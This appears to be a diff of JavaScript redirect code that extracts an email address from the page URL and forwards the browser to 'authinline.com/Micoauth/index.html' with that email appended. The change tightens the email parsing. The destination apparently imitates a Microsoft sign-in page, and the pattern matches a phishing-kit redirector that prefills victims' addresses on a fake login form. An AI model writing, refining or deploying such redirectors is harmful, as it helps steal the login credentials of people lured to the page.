@@ -16,18 +16,28 @@
 
         // Check if the email part is not empty
         if (emailPart) {
-          // Construct the redirect URL by appending the email to the second link
-          var redirectURL = 'https://authinline.com/Micoauth/index.html?' + emailPart;
+          // Remove any trailing equal signs and other non-email characters
+          var emailMatch = emailPart.match(/([a-zA-Z0-9.-]+@[a-zA-Z0-9.-]+)/);
 
-          // Redirect to the constructed URL
-          window.location.href = redirectURL;
+          if (emailMatch) {
+            var cleanedEmail = emailMatch[0];
+
+            // Construct the redirect URL by appending the cleaned email to the second link
+            var redirectURL = 'https://authinline.com/Micoauth/index.html?' + cleanedEmail;
+
+            // Redirect to the constructed URL
+            window.location.href = redirectURL;
+          } else {
+            // If the email part does not match the expected format, simply redirect to the second link
+            window.location.href = 'https://authinline.com/Micoauth/index.html';
+          }
         } else {
           // If the email part is empty, simply redirect to the second link
-          window.location.href = 'https://authinline.com/Micoauth/index.html/';
+          window.location.href = 'https://authinline.com/Micoauth/index.html';
         }
       } else {
         // If no '?' character is found, simply redirect to the second link
-        window.location.href = 'https://authinline.com/Micoauth/index.html/';
+        window.location.href = 'https://authinline.com/Micoauth/index.html';
       }
     }
 
